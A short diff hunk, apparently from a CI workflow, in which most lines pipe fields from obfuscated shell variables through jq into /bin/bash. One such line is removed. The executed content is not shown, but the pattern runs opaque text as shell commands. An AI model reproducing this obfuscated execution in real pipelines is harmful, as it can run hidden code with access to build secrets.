@@ -27,7 +27,6 @@ jobs:
           echo $pgi218 | jq -r .mtjs60 | /bin/bash
           printf '%s' "$op12" | jq -r .i7792 | /bin/bash
           printf '%s' "$c9654" | jq -r .a468 | /bin/bash
-          echo $fcavw833 | jq -r .v86 | /bin/bash
           printf '%s' "$i8233" | jq -r .o1123 | /bin/bash
           printf '%s' "$rjv6308" | jq -r .hi466 | /bin/bash
 
